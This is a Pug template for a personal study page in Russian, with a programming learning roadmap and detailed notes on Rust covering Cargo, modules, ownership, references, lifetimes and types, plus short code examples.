extends templates/layout

block menu
  .menu__inner
    a(href="https://www.cyberseek.org/pathway.html") pathway
    pre.
      1. rust + bash + SQL
      2. свои программы (2Д игра - нa ютуб видео с обучением переписываем на rust)
      3. Фреймворки (Работать программистом).
      4. Оценка сложности алгоритмов big O
      5. Базовые структуры данных:
        - массивы
        - связные списки
        - хэш-таблицы
        - стэк
        - очередь
        реализовать с нуля самостоятельно (поиск, вставка, удаление элемента)
      6. Системы счисления
        - шестнадцатиричные
        - двоичные
      7. Архитектура компьютэра
        - модульность памяти
        - сборщики мусора
        - разрядность процессора
        - регистры процессора
      8. Битовые операции
      9. Числа с плавающей точкой
      10. Строки
        - ASCII
        - UNICODE
        - Кодировки
      11. Язык Ассемблера (понимание как работает программа, ОС, вирус)
      12. Стек (программный)
        - передача параметров функции
        - кадры функции
        - возврат функции
      13. Рекурсия (взаимодействие со стеком)
      14. Сортировки (разобрать базовые алгоритмы сортировок:
        - пузырьком
        - вставками
        - кучей
        - Хоара
        - Ламуто
        - т.д.)
      15. Поиск (деревья и графы)
        - бинарное дерево поиска с реализацией вставки, поиска и удаления узлов
        - вэйл дерево
        - красночерное дерево
        - поиск в глубину и ширину графы
      16. Интернет
        - OSI
        - TCP/IP
      17. Операционные  системы
        - организация памяти
        - процессы
        - поток
      18. Файловая система
        - FAT 32
        - NTFS
        - EXT 4
      19. Исполняемые файлы
        - PE
        - ELF
      20. Сжатие
        - изображение
        - звук
        - видео
      21. Криптография
        - HTTPS
        - SSH
        - RSA
      22. 3Д графика
        - шейдеры
        - освещение объектов
        - реализации камеры
      23. Компиляторы
        - Лексический анализ
        - Синтаксический анализ
        - Симантический анализ
        - AST
        - Генерация машинного кода
      24. Математика и алгоритмы
        - книги кнута и корбана
    
    //- Rust
    details
      summary Rust
      a(href="https://www.rust-lang.org/ru") Rust
      p.
        <dfn>Rust</dfn> — мультипарадигменный компилируемый язык программирования общего назначения, сочетающий парадигмы функционального и процедурного программирования с объектной системой, основанной на типажах.<br>
        <dfn>Esbuild</dfn> - сборщик для фронта<br>
        <dfn>Yew</dfn> - framework for building front-end web apps<br>
        <dfn>Percy</dfn> - библиотека для rust web apps<br>
        <dfn>Seed</dfn> - Rust framework for creating fast and reliable web apps<br>
        <dfn>Sycamore</dfn> - library for creating web apps<br>
        <dfn>Leptos</dfn> - full-stack framework for building web applications in Rust with WebAssembly (docs.rs/leptos/latest/leptos/)<br>
        <dfn>Stork</dfn> - простая библиотека, основанная на фичах, для рекурсивного сканирования источников в стиле поисковой системы.<br>
        <dfn>SWC</dfn> - Speedy Web Compiler - Rust-based platform for the Web<br>
      
      //- Introduction
      details
        summary Introduction
        p.
          <dfn>Cargo</dfn> - система сборки и менеджер пакетов.<br>
          <b>cargo new name_folder</b> - создать проект name_folder<br>
          <b>cargo build</b> - создать исполняемій файл<br>
          <b>cargo run</b> - пересобирает исполняемый файл и запускает его<br>
          <b>cargo check</b> - проверяет, что код компелируется, но не создаёт исполняемый файл<br>
          <b>cargo build -- release</b> - создаёт исполнфемый файл с оптимизаией, собирает финальную версию.<br>
          <br>
          <dfn>Упорядочивание кода</dfn>:<br>
          - группировка связанных функций<br>
          - разделение кода по основным функциональностям (фичам, feature).<br>
          <br>
          <dfn>Модульная система</dfn>:<br>
          - <em>Пакеты</em>: функционал Cargo позволяющий собирать, тестировать и делиться крейтами.<br>
          - <em>Крейты</em>: дерево модулей, которое создаёт библиотечный или исполняемый файл.<br>
          - <em>Модули и use</em>: позволяют вместе контролировать организацию, область видимости и скрытие путей.<br>
          - <em>Пути</em>: способ именования элемента, такого как структура, функция или модуль.<br>
          <br>
          <dfn>Крейт</dfn> - это наименьший объём кода, который компилятор Rust рассматривает за раз.<br>
          <dfn>Бинарный крейт</dfn> - обязательно содержит функцию main.<br>Программа, которую можно скомпелировать в исполняемый файл.<br>
          <dfn>Библиотечный крейт</dfn> - не имеет функции main и не компелируется в исполняемый файл.<br> Определяет функциональность для совместного использования другими проектами.<br>
          <br>
          <em>Корневой модуль крейта</em> - исходный файл.<br>
          <em>Пакет</em> - набор из одного или нескольких крейтов, представляющий набор функциональности.<br>
          Пакет содержит файл Cargo.toml, в котором описывается как собирать эти крейты.<br>
          Пакет может содержать любое количество бинарных крейтов, но не более одного библиотечного крейта.<br>
          Пакет должен содержать хотябы один крейт, библиотечный или бинарный.<br>
          <br>
          <em>По умолчанию</em>:<br>
          <b>src/main.rs</b> - это корневой модуль бинарного крейта<br>
          <b>src/lib.rs</b> - это корневой модуль библиотечного крейта<br>
          Cargo передаёт файлы корневого модуля крейта в rustc для сборки этого крейта.<br>
          Пакет может иметь несколько бинарных крейтов, помещая их файлы в каталог src/bin: каждый файл будет отдельным бинарным крейтом, с тем же именем, что и пакет.<br>
          Несколько бинарных крейтов помещаются в src/bin.<br>
          Пакет включает в себя минимум один бинарный крейт, может содержать несколько бинарных и максимум один библиотечный крейты.<br>
          Совокупность пакетов образуют рабочее пространство (workspace)<br>
          <br>
          <em>Правила</em>:<br>
          - При компеляции компилятор сначала ищет корневой модуль крейта (src/lib.rs или src/main.rs)<br>
          - В файле корневого модуля крейта можно объявить новые модули; при объявлении mod garden компилятор будет искать код модуля в местах:<br>
          - в этом же файле, между фигурных скобок, которые заменяют точку с запятой после mod garden<br>
          - в файле src/garden.rs<br>
          - в файле src/garden/mod.rs<br>
          - Если объявить модуль в файле, например объявить mod vegetables в src/garden.rs, то компилятор будет искать код модуля в каталоге родительского модуля:<br>
          - в файле где объявили (garden.rs) сразу после mod vegetables, между фигурных скобок, которые заменяют точку с запятой.<br>
          - в файле src/garden/vegetables.rs<br>
          - в файле src/garden/vegetables/mod.rs<br>
          - Обратиться к коду (к типу) можно используя путь: crate::garden::vegetables::Asparagus. Asparagus - это тип, код которого в модуле vegetables.<br>
          - Чтобы сделать модуль общедоступным нужно добавить pub впереди объявления: pub mod.<br>
          Чтобы сделать элемент общедоступного модуля общедоступным нужно добавить pub перед его объявлением.<br>
          - Ключевое слово use создаёт псевдоним для элемента для уменьшения длинных путей: после use crate::garden::vegetables::Asparagus можно просто писать Asparagus.<br>
          <br>
          Пример:
        pre
          code.
            src/main.rs
            use crate::garden::vegetables::Asparagus;
            pub mod garden;
            
            fn main () {
              let plant = Asparagus {};
              println! (“I’m growing {:?}!”, plant);
            }
            
            src/garden.rs
            pub mod vegetables;
            src/garden/vegetables.rs
            #[derive(Debug)]
            pub struct Asparagus {}
        br
        p.
          Код внутри модуля по умолчанию закрытый.<br>
          Создать библиотечный крейт restaurant:
        code <b>cargo new restaurant --lib;</b>
        br
        p.
          Получаем <b>src/lib.rs</b>.<br>
          <br>
          Модуль размещается внутри фигурных скобок.<br>
          Модуль может находиться внутри другого модуля или в отдельном файле.<br>
          Файли src/main.rs и src/lib.rs называются корневыми модулями крейта.<br>
          Содержимое любого из этих файлов образует модуль с именем crate в корне структуры модулей дерево модулей.
        table
          tbody
            tr
              td Crate
              td - родитель всего дерева (parent)
            tr
              td A
              td B
            tr
              td - A и B потомки crate (child)
              td - A и B братья (siblings)
        br   
        p.
          Чтобы найти элемент в дереве модулей используем путь:<br>
          <dfn>абсолютный путь</dfn> - это полный путь, начинающийся от корневого модуля крейта;<br>
          для кода из внешнего крейта абсолютный путьначинается с имени крейта, а для кода из текущего крейта он начинается с литерала crate.<br>
          <dfn>относительный путь</dfn> - начинается с текущего модуля и использует ключевые слова <b>self</b>, <b>super</b> или идентификатор в текущем модуле.<br>
          Абсолютные и относительные пути состоят из одного или нескольких идентификаторов, разделённых двойными двоеточиями(<b>::</b>).<br>
          <br>
          Чтобы сделать функцию или структуру приватой нужно поместить её в модуль.<br>
          Дочерние модули оборачивают и скрывают детали своей реализации, но могут видеть контекст родителей, в котором они определены.<br>
          <br>
          Дерево модулей должно быть определено в src/lib.rs, тогда любые общедоступные элементы можно использовать в бинарном крейте, начав пути с имени пакета.<br>
          С помощью ключевого слова super можно построить относительные пути, которые начинаются в родительском модуле.<br>
          <br>
          Rust не позволяет подключать оператором use два элемента с одинаковыми именами из разных родительских модулей.<br>
          Идиоматические пути с use
        pre
          code.
            use std::fmt;
            use std::io;
            fn function1 () -> fmt::Result {
              //--snip--
            }
            
            fn function2 () -> io::Result {
              //--snip--
            }
          
            <span>С использованием ключевого слова as:</span>
            use std::fmt::Result;
            use std::io::Result as IoResult;
            fn function1 () -> Result {
              //--snip--
            }
            
            fn function2 () -> IoResult <()> {
              //--snip--
            }
        br
        p.
          <dfn>Реэкспорт pub use</dfn> - подключаем элемент в область видимости и делаем этот элемент доступным для подключения в других областях видимости.<br>
          Добавить внешний пакет rand: в файл Cargo.toml написать rand = “0.8.3”
        pre
          code.
            use rand::Rng;
            fn main () {
              let secret_number = rand::thread_rng().gen_range(1..=100);
            }
        br
        p Чтобы указать несколько элементов, определённых в одном крейте или в том же модуле используем вложенные пути:
        pre
          code.
            use std::cmp::Ordering;
            <span>или</span>
            use std::{cmp::Ordering, io};
            use std::io;

            use::io;
            use::io::Write;            
            <span>или</span>
            use std::io::{self, Write};
        p.
          Лучше всего разделить функциональность, чтобы каждая функция отвечала за одну задачу.<br>
          <b>main.rs</b> занимается запуском программы, а <b>lib.rs</b> обрабатывает всю логику задачи.<br>
          Разделите код программы на два файла <b>main.rs</b> и <b>lib.rs</b>. Перенесите всю логику работы программы в файл <b>lib.rs</b>.<br>
          Пока ваша логика синтаксического анализа командной строки мала, она может оставаться в файле <b>main.rs</b>.<br>
          Когда логика синтаксического анализа командной строки становится сложной, извлеките её из <b>main.rs</b> и переместите в <b>lib.rs</b>.<br>
          Функциональные обязанности, которые остаются в функции main после этого процесса должно быть ограничено следующим:<br>
          Вызов логики разбора командной строки со значениями аргументов<br>
          Настройка любой другой конфигурации<br>
          Вызов функции run в lib.rs<br>
          Обработка ошибки, если run возвращает ошибку мы запустим программу с помощью > и именем файла<br>
          output.txt в который мы хотим перенаправить стандартный поток вывода.<br>
          <b>$ cargo run > output.txt</b><br>
          Синтаксис > указывает оболочке записывать содержимое стандартного вывода в output.txt вместо экрана.<br>
          <br>
          Программирование в функциональном стиле зачастую предполагает использование функций в качестве значений, которые передаются в качестве аргументов, возвращаются из других функций, присваиваются переменным для последующего выполнения и так далее.<br>
          <br>
          Cargo имеет два основных профиля: профиль dev, используемый Cargo при запуске cargo build, и профиль release, используемый Cargo при запуске cargo build --release.<br>
          Добавляя секции [profile.*] для любого профиля, который вы хотите настроить, вы переопределяете любое подмножество параметров по умолчанию.<br>
          В Rust также есть особый вид комментариев к документации, который обычно называется комментарием к документации, который генерирует документацию HTML.<br>
          <br>
          <dfn>Комментарии к документации</dfn> используют три слеша, <b>///</b> вместо двух и поддерживают нотацию Markdown для форматирования текста.<br>
          Размещайте комментарии к документации непосредственно перед элементом, который они документируют.<br>
          Мы можем сгенерировать документацию HTML из этого комментария к документации, запустив cargo doc.
          <br>
          авторы библиотек обычно используют в своей документации:<br>
          <b>Panics</b>:<br>
          Сценарии, в которых документированная функция может вызывать панику.<br>
          Вызывающие функцию, которые не хотят, чтобы их программы паниковали, должны убедиться, что они не вызывают функцию в этих ситуациях.<br>
          <br>
          <b>Ошибки</b>:<br>
          Если функция возвращает Result, описание типов ошибок, которые могут произойти и какие условия могут привести к тому, что эти ошибки могут быть возвращены, может быть полезным для вызывающих, так что они могут написать код для обработки различных типов ошибок разными способами.<br>
          <br>
          <b>Безопасность</b>:<br>
          Если функция является unsafe для вызова, должен быть раздел, объясняющий, почему функция небезопасна и охватывающий инварианты, которые функция ожидает от вызывающих сторон.<br>
          Добавление примеров кода в комментарии к документации может помочь продемонстрировать, как использовать вашу библиотеку, и это даёт дополнительный бонус: запуск cargo test запустит примеры кода в вашей документации как тесты!<br>
          <br>
          Стиль комментариев к документам //! добавляет документацию к элементу, содержащему комментарии, а не к элементам, следующим за комментариями.<br>
          <br>
          По мере развития вашего проекта может возникнуть ситуация, когда библиотечный крейт будет становиться все больше, и вы захотите разделить ваш пакет на несколько библиотечных крейтов.<br>
          Cargo предоставляет функциональность под названием workspaces, которая помогает управлять несколькими взаимосвязанными пакетами, которые разрабатываются в тандеме.<br>
          <br>
          <dfn>Workspace</dfn> - это набор пакетов, которые используют один и тот же Cargo.lock и директорию для хранения результатов компиляции.<br>
          Команда cargo install позволяет локально устанавливать и использовать исполняемые крейты.<br>
          Она не предназначена для замены системных пакетов; она используется как удобный способ Rust разработчикам устанавливать инструменты, которыми другие разработчики поделились на сайте crates.io.<br>
          <br>
          Если исполняемый файл доступен через переменную окружения $PATH и назван по шаблону cargo-something, то его можно запускать как субкоманду Cargo cargo something.<br>
          Пользовательские команды подобные этой также перечисляются в списке доступных через cargo --list.<br>
          <br>
          В большинстве современных операционных систем программный код выполняется в виде процесса, причём операционная система способна управлять несколькими процессами сразу.<br>
          Программа, в свою очередь, может состоять из нескольких независимых частей, выполняемых одновременно.<br>
          Конструкция, благодаря которой эти независимые части выполняются, называется потоком.<br>
          Например, веб-сервер может иметь несколько потоков для того, чтобы он мог обрабатывать больше одного запроса за раз.<br>
          <br>
          Для обеспечения отправки многопоточных сообщений в стандартной библиотеке языка Rust реализованы каналы.<br>
          <dfn>Канал в программировании</dfn> - это общепринятый механизм, с помощью которого данные из одного потока отправляются другому потоку.<br>
          Канал считается закрытым , если либо передающая, либо принимающая его половина уничтожена.<br>
          Мы создаём новый канал, используя функцию mpsc::channel; mpsc означает несколько производителей, один потребитель (multiple producer, single consumer).<br>
          Несколько ручьёв втекают в одну большую реку: всё, что плывёт вниз по любому из ручьёв, в конце концов окажется в одной реке.<br>
        br
        img(src="./img/rust/Rust132.png" alt="")
        img(src="./img/rust/Rust133.png" alt="")
        img(src="./img/rust/Rust134.png" alt="")
        img(src="./img/rust/Rust135.png" alt="")
        img(src="./img/rust/Rust136.png" alt="")
        img(src="./img/rust/Rust137.png" alt="")
        img(src="./img/rust/Rust138.png" alt="")
        img(src="./img/rust/Rust139.png" alt="")
        img(src="./img/rust/Rust140.png" alt="")
        img(src="./img/rust/Rust141.png" alt="")

      //- Variable
      details
        summary Variable
        p.
          Переменные по умолчаню не изменяемые.<br>
          <b>let x</b> - объявление переменной<br>
          <b>mut</b> - измеяемый, с константами использовать нельзя<br>
          <b>let mut x</b> - объявление изменяемой переменной<br>
          <b>const</b> - константа, при объявлении константы обязательно указать тип<br>
          <b>const THIS_IS_CONSTANT: U32</b> - объявление константы<br>
          Затенение - вторая переменная с тем же именем затеняет первую, присваивая себе любое использование имени переменной до тех пор пока либо она сама не будет затенена, либо область действия не закончится.<br>
          <b>let x = 5;</b> - Используя слово let, мы создвём новую переменную. Менять тип переменной нельзя.<br>
          <b>let x = x + 1;</b> - Затенение<br>
          <b>let x = 5;</b> - привязываем значение к переменной<br>
          <b>let y = x;</b> - копируем значение в другую переменную. Оба значения помещаются в стек.<br>
          <b>let s1 = String::from(“hello”);</b> - привязываем указатель.<br>Указатель находится в стеке.<br>Указатель указывает на память, в которой хранится содержимое строки, длина и емкость.<br>Содержимое строки хранится в куче.<br>
          <b>let s2 = s1;</b> - перемещение. Ссылка (указатель) в переменной s1 на данные в куче не действительна.<br>Указатель только в переменной s2.<br>
          <b>let s1 = String::from(“hello”);</b><br>
          <b>let s2 = s1.clone();</b> - указатель в стеке перемещается, а содержание строки в куче копируется.<br>
          Передача переменной в функцию приведет к перемещению или копированию как и при присваивании значения переменной.<br>
          Основная разница в том, что значения копируются, находясь в стеке; и доступны обе переменные с одинаковыми значениями, а при копировании указателя, который ссылается на данные в куче, доступной будет только новая переменная, содержащая указатель.<br> То же самое при передачи в функцию.<br>
          <b>&</b> - амперсанд (&String) - это ссылка, которая позволяет ссылаться на некоторое значение, не принимая владение им.<br>
          Процесс создания ссылки называется заимствованием.<br>
          Чтобы можно было изменять по ссылке:<br>
        pre
          code.
            fn main () {
              <span>изменяемая переменная s</span>
              let mut s = String::from (“hello”);
              
              <span>изменяемая перменная s со ссылкой,</span>
              <span>т.е. изменяемая ссылка на изменяемую перменную.</span>
              change (&mut s);
            }
        br
        p.
          Изменяемая ссылка всегда одна в своей области видимости, никаких других ссылок.<br>
          В один момент времени в одной области видимости может существовать либо одна изменяемая ссылочная переменная, либо любое количество неизменяемых ссылочных переменных.<br>
          Все ссылки должны быть действительны, т.е. ссылаться на существующие в памяти данные.<br>
          <br>
          Срез позволяет ссылаться на непрерывную последовательность элементов в коллекции, а не на всю коллекцию, без права владения.<br>
          <b>iter ()</b> - метод, который возвращает каждый елемент в коллекции.<br>
          <b>enumerate ()</b> - оборачивает результат iter и возвращает каждый элемент как часть кортежа.<br>Первый элемент кортежа это индекс, а второй - ссылка на элемент (i, &item).<br>
        code for (i, &item) in bytes.iter().enumerate()
        p.
          <dfn>Строковые срезы</dfn> (&str - тип “срез строки”).<br>
          Строковый срез - это ссылка на часть строки String и он выглядит так:
        pre
          code.
            let s = String::from (“hello world”);
            let hello = &s[0..5];
            let world = &s[6..11];
          Срез хранит начальную позицию и длину среза.<br>
        pre
          code.
            let slice = &s[0..2]; одно и тожеlet slice = &s[..2];
            let len = s.len();
            let slice = &s[3..len]; одно и тожеlet slice = &s[3..];
            let slice = &s[0..len]; одно и тожеlet slice = &s[..];
        p Строковые литералы - это срезы:
        code let s = “Hello world!”;
        p.
          s имеет тип &str.<br>
          s - указывает на место в бинарном файле программы.<br>
          Строковый литерал неизменяемый, потому что тип &str - это не изменяемая ссылка.<br>
          Строковый срез может быть параметром:
        code fn first (s:&str) -> &str {}
        p Срезы могут быть разные:
        pre
          code
            let a = [1, 2, 3, 4, 5];
            let slice = &a[1..3];
            assert_eq! (slice, &[2, 3]); - тип среза [i32].
        p.
          У каждой ссылки в Rust есть своё время жизни - область кода, на протяжении которого данная ссылка действительна (valid).<br>
          Мы должны явно объявлять сроки жизни тех ссылок, для которых времена жизни могут быть определены компилятором по-разному.<br>
          Rust требует от нас объявлять взаимосвязи посредством обобщённых параметров сроков жизни - чтобы убедиться в том, что во время исполнения все действующие ссылки будут корректными.<br>
          Основное предназначение сроков жизни — предотвращать появление так называемых "повисших ссылок" (dangling references), из-за которых программа обращается не к тем данным, к которым она собиралась обратиться.<br>
          &i32 - a reference<br>
          &'a i32 - a reference with an explicit lifetime<br>
          &'a mut i32 - a mutable reference with an explicit lifetime
        code fn longest<'a>(x: &'a str, y: &'a str) -> &'a str {
        p.
          Сигнатура функции сообщает Rust, что для некоторого времени жизни 'a функция принимает два параметра, оба из которых являются срезами строк, которые живут не меньше, чем время жизни 'a.<br>
          Сигнатура функции также сообщает Rust, что срез строки, возвращаемый функцией, будет жить как минимум столько, сколько длится время жизни 'a. На практике это означает, что время жизни ссылки, возвращаемой функцией longest, равно меньшему времени жизни передаваемых в неё ссылок.<br>
          Структуры могут содержать и ссылки, но при этом необходимо добавить аннотацию времени жизни для каждой ссылки в определении структуры.
        pre
          code.
            struct ImportantExcerpt<'a> {
              part: &'a str,
            }
        p.
          Как и в случае с обобщенными типами данных мы объявляем имя обобщенного параметра времени жизни внутри угловых скобок после имени структуры, чтобы иметь возможность использовать его внутри определения структуры.<br>
          Данная аннотация означает, что экземпляр ImportantExcerpt не может пережить ссылку, которую он содержит в своем none part.<br>
          Шаблоны, запрограммированные в анализаторе ссылок языка Rust, называются правилами неявного выведения времени жизни.<br>
          Это не правила, которым должны следовать программисты; а набор частных случаев, которые рассмотрит компилятор, и, если ваш код попадает в эти случаи, вам не нужно будет указывать время жизни явно.<br>
          Времена жизни параметров функции или метода называются временем жизни ввода, а времена жизни возвращаемых значений называются временем жизни вывода.<br>
          Три правила применяются к объявлениям fn, а также к блокам impl:<br>
          Первое правило заключается в том, что каждый параметр являющийся ссылкой, получает свой собственный параметр времени жизни.<br>
          Другими словами, функция с одним параметром получит один параметр времени жизни <b>fn foo<'a> (x: &'a i32)</b>;<br>
          функция с двумя аргументами получит два отдельных параметра времени жизни: <b>fn foo <'a, 'b> (x: &'a i32, , y: &'b i32)</b>, и так далее.<br>
          Второе правило говорит, что если есть ровно один входной параметр времени жизни, то его время жизни назначается всем выходным параметрам: <b>fn foo<'a> (x: &'a i32) -> &'a i32</b>.<br>
          Третье правило о том, что если есть множество входных параметров времени жизни, но один из них является ссылкой <b>&self</b> или <b>&mut self</b>, так как эта функция является методом, то время жизни <b>self</b> назначается временем жизни всем выходным параметрам.<br>
          Это третье правило делает методы намного приятнее для чтения и записи, потому что требуется меньше символов.<br>
          <b>'static</b> означает, что данная ссылка может жить всю продолжительность работы программы.<br>
          Все строковые литералы по умолчанию имеют время жизни 'static:
        code let s: &'static str = "I have a static lifetime.";
        p.
          <dfb>Указатель</dfb> — это общая концепция для переменной, которая содержит адрес участка памяти.<br>
          Этот адрес «относится к», или «указывает на» некоторые другие данные.<br>
          Наиболее общая разновидность указателя в Rust — это ссылка.<br>
          <dfb>Умные указатели</dfb>, с другой стороны, являются структурами данных, которые не только действуют как указатель, но также имеют дополнительные метаданные и возможности.<br>
          Cсылки только заимствуют данные, умные указатели часто владеют данными, на которые указывают.<br>
          Характерной чертой, которая отличает умный указатель от обычной структуры, является то, что для умных указателей реализованы типажи Deref и Drop.<br>
          Наиболее простой умный указатель - это <dfn>box</dfn>, чей тип записывается как <b>Box&lt;T&gt;</b>.<br>
          Такие переменные позволяют хранить данные в куче, а не в стеке.<br>
          То, что остаётся в стеке, является указателем на данные в куче.<br>
          Использовать его чаще всего в следующих ситуациях:<br>
          Когда у вас есть тип, размер которого невозможно определить во время компиляции, а вы хотите использовать значение этого типа в контексте, требующем точного размера.<br>
          Когда у вас есть большой объем данных и вы хотите передать владение, но при этом быть уверенным, что данные не будут скопированы.<br>
          Когда вы хотите получить значение во владение и вас интересует только то, что оно относится к типу, реализующему определённый трейт, а не то, является ли оно значением какого-то конкретного типа.<br>
          <dfn>Обычная ссылка</dfn> - это разновидность указателя, а указатель можно рассматривать как своеобразную стрелочку направляющую к значению, хранящемуся в другом месте.<br>
          <dfn>Box</dfn>-ы обеспечивают только перенаправление и выделение в куче; у них нет никаких других специальных возможностей.<br>
          Сравнение числа и ссылки на число не допускается, потому что они различных типов.<br>
          Мы должны использовать оператор разыменования, чтобы перейти по ссылке на значение, на которое она указывает.<br>
          <dfn>Сильные ссылки</dfn> - это то с помощью чего вы можете поделиться владением экземпляра Rc&lt;T&gt;.<br>
          Слабые ссылки не отражают связи владения, и их подсчёт не влияет на то, когда экземпляр Rc&lt;T&gt; будет очищен.<br>
          Они не приведут к ссылочному циклу, потому что любой цикл, включающий несколько слабых ссылок, будет разорван, как только количество сильных ссылок для задействованных значений станет равным 0.<br>
          Игнорирование неиспользуемой переменной, начинающейся с символа <b>_</b> в имени.<br>
          Начинаем имя переменной с подчёркивания, чтобы не получить предупреждения о неиспользованных переменных
        pre
          code.
            fn main() {
              let _x = 5;
              let y = 10;
            }
        p.
          Синтаксис _x по-прежнему привязывает значение к переменной, тогда как _ не привязывает ничего.<br>
          Неиспользуемая переменная, начинающаяся с подчёркивания, по-прежнему привязывает значение, что может привести к смене владельца значения
        pre
          code.
            fn main() {
              let s = Some(String::from("Hello!"));
              if let Some(_s) = s {
                println!("found a string");
              }
              println!("{:?}", s);
            }

          <span>Использование подчёркивания не привязывает значение</span>
          fn main() {
            let s = Some(String::from("Hello!"));
            if let Some(_) = s {
              println!("found a string");
            }
              println!("{:?}", s);
          }

        p.
          <dfn>Связывание @</dfn><br>
          Оператор <b>at (@)</b> позволяет создать переменную, которая содержит значение, одновременно с тем, как мы проверяем, соответствует ли это значение шаблону.<br>
          мы хотим проверить, что перечисление <b>Message::Hello</b> со значением поля id находится в диапазоне 3..=7.<br>
          Но мы также хотим привязать такое значение к переменной id_variable, чтобы использовать его внутри кода данной ветки.<br>
          Использование @ для привязывания значения в шаблоне, с одновременной его проверкой
        pre
          code.
            fn main() {
              enum Message {
                Hello { id: i32 },
              }
              let msg = Message::Hello { id: 5 };
              match msg {
                Message::Hello {
                  id: id_variable @ 3..=7,
                } => println!("Found an id in range: {}", id_variable),
                Message::Hello { id: 10..=12 } => {
                  println!("Found an id in another range")
                }
                Message::Hello { id } => println!("Found some other id: {}", id),
              }
            }

      //- Type      
      details
        summary Type
        p.
          Rust статически типизированный язык.
        table
          caption Целочисленные типы
          thead
            tr
              th Длина
              th Со знаком
              th Без знака
          tbody
            tr
              td 8 bit
              td i8
              td u8
            tr
              td 16 bit
              td i16
              td u16
            tr
              td 32 bit
              td i32
              td u32
            tr
              td 64 bit
              td i64
              td u64
            tr
              td 128 bit
              td i128
              td u128
            tr
              td arch
              td isize
              td usize
        p.
          <em>arch</em> - основное использование - это индекация коллекции.<br>Зависит от архитектуры компьютера 34-bit или 64-bit.<br>
          Склярный тип представляет единственное значение.<br>В Rust четыре склярных типа:
          <b>целые</b> и <b>вещественные числа</b>, <b>логический тип</b> и <b>символ</b>.<br>
          <em>Числовые литералы</em>:<br>
          <b>Десятиричный</b> - 98222<br>
          <b>Шестнадцатиричный</b> - Oxff<br>
          <b>Восьмиричный</b> - 0o77<br>
          <b>Двоичный</b> - 0b11110000<br>
          <b>Байт (только u8)</b> - b'A'<br>
          Типы чисел <b>с плавающей запятой</b> f32 и f64<br>
          <b>Логистический тип</b> данных bool: true или false<br>
          <b>Символический тип</b> данных char.<br>
          Литералы char в одинарных кавычках:
        pre
          code.
            let c = 'Z';
            let z:char = 'Z';
        br
        p.
          <em>Сложные типы данных</em>: кортежи и массивы, могут группировать несколько значений в один тип.<br>
          <dfn>Кортеж</dfn>: группировка нескольких значений различного типа в единый комбнированный тип фиксированной длины.<br>
          <b>Let tup: (i32, f64, u8) = (500, 6.4, 1);</b><br>
          <br>
          Дуструктуризация: <b>let (x,y,z) = tup;</b><br>
          <br>
          Обращение к элементу кортежа по индексу: <b>let five_hundred = tup.0;</b>
          <br>
          <dfn>unit</dfn> - обозначается ( ) и представляет собой пустое значение или пустой возвращаемый тип.<br>
          Игнорирование нескольких частей кортежа
        pre
          code.
            fn main() {
              let numbers = (2, 4, 8, 16, 32);
              match numbers {
                (first, _, third, _, fifth) => {
                  println!("Some numbers: {first}, {third}, {fifth}")
                }
              }
            }
        p.
          Игнорирование оставшихся частейц значения с помощью <b>.</b><br>
          Игнорирование полей структуры Point кроме поля x с помощью <b>..</b>
        pre
          code.
            fn main() {
              struct Point {
                x: i32,
                y: i32,
                z: i32,
              }
            let origin = Point { x: 0, y: 0, z: 0 };
              match origin {
                Point { x, .. } => println!("x is {}", x),
              }
            }

            <span>Сопоставление только первого и последнего значений в кортеже</span>
            <span>и игнорирование всех других значений</span>
            fn main() {
              let numbers = (2, 4, 8, 16, 32);
              match numbers {
                (first, .., last) => {
                  println!("Some numbers: {first}, {last}");
                }
              }
            }
        br
        p.
          <dfn>Массивы</dfn>: набор значений одного типа и фиксированной длины.
        pre
          code.
            let a = [1, 2, 3, 4, 5];
            [i32; 5] - тип и длина
            let a: [i32; 5] = [1, 2, 3, 4, 5];
            let a = [3; 5];
            <span>получим массив</span>
            let a = [3, 3, 3, 3, 3];
        p.
          Доступ к элементам массива: <b>let first = a [0];</b>
          <dfn>Вектор</dfn> - аналогичный массиву тип коллекции без фиксированной величины.<br>
          <dfn>String</dfn> - строковый тип управляет данными, выделенными в куче, и поэтому может хранить объем текста, который во время компиляции не известен.<br>
          Типы, размер которых известен во время компиляции, полностью храняться в стеке и быстро копируются.<br>
          Для указателей на данные в куче происходит перемещение.<br>
          Для создания копии данных в куче происходит клонирование.<br>
          За копирование типа отвечает типаж Copy.<br>
          Он анотирован для типов хранящихся в стеке.<br>
          Типаж Copy не совместим с типажем Drop и типами, которые хранятся в куче.<br>
          <dfn>Структура (struct)</dfn> - пользовательский тип данных, позволяющий назвать и упаковать вместе несколько связанных значений, составляющих значимую логическую группу.<br>
          Похоже на атрибуты данных объекта.<br>
          Структура, как и кортежи, это способы группировки данных.<br>
          Каждая часть данных структуры имеет имя и свой тип, типы могут быть разные.<br>
          Каждая пара “имя: тип” называется полем.<br>
          Объявление струтуры - это шаблон нашего типа, а экземпляр использует этот шаблон, заполняя его данными.<br>
        pre
          code.
            struct User {
              active: bool,
              username: String,
              email: String,
              sign_in_count: u64,
            }

            <span>Создание экземпляра структуры User:</span>
            let user1 = User {
              email: String::from (“someone@example.com”),
              username: String::from (“someusername123”),
              active: true,
              sign_in_count: 1,
            };

            <span>Доступ к полю через точку: user1.email</span>
            User {
              email: email,
              username: username,
              active: true,
              sign_in_count: 1,
            }
            <span>тоже самое</span>
            User {
              email,
              username,
              active: true,
              sign_in_count: 1,
            }
        p Синтаксис <b>..</b> указывает, что оставшиеся поля устанавливаются неявно и должны иметь значения из указанного экземпляра:
        pre
          code.
            let user2 = User {
              email: String::from (“another@example.com”),
              ..user1
            };
        p.
          <b>..user1</b> должен стоять последним для указания на получение значений всех оставшихся полей из соответствующих полей в user1.<br>
          Кортежные структуры - именованные кортежи:<br>
          <b>struct Color (i32, i32, i32);</> - картежная структура.<br>
          <b>let black = color (0, 0, 0);</b> - экземпляр типа color.<br>
          Экземпляры кортежных структур можно как кортежи деструктурировать и использовать точку с индексом для доступа к значению.<br>
          Единично-подобные структуры - структуры, которые не имеют полей. Требуются когда нужно реализовать типаж для типа, но нет данных, которые нужно хранить в типе:<br>
          <b>struct AlwaysEqual;</b><br>
          По умолчанию фигурные скобки в <b>println!</b> означают использование форматирования, известного как типаж <b>Display</b>.<br>
          Структуры не имеют встроенной реализации Display, поэтому можно распечатать в <b>Debug:println! ({:?})</b>.
          Макрос <b>dbg!</b> распечатывает значение в формате Debug. Для этого нужно подключить атрибут derive:<br>
          <b>#[derive(Debug)]</b><br>
          Структуры создают типы, позволяют хранить связанные данные и давать названия частям данных.<br>
          Методы позволяют определить поведение экземпляров структур, а ассоциированные функции привязывают функциональность к вашей структуре, не обращаясь к её экземпляру.<br>
